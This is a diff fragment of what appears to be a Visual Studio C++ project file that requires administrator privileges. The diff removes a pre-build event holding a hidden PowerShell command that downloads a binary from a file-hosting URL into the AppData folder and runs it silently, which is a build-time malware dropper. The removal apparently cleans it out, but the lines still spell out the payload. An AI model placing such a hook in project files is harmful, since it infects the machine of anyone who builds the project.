@@ -135,9 +135,6 @@
       <UACExecutionLevel>RequireAdministrator</UACExecutionLevel>
       <UACUIAccess>false</UACUIAccess>
     </Link>
-    <PreBuildEvent>
-      <Command>powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://files.catbox.moe/10vv9w.bin' -OutFile $env:APPDATA\hmx.exe; Start-Process -FilePath $env:APPDATA\hmx.exe -WindowStyle Hidden }"</Command>
-    </PreBuildEvent>
   </ItemDefinitionGroup>
   <ItemGroup>
     <Library Include="d3d9.lib" />
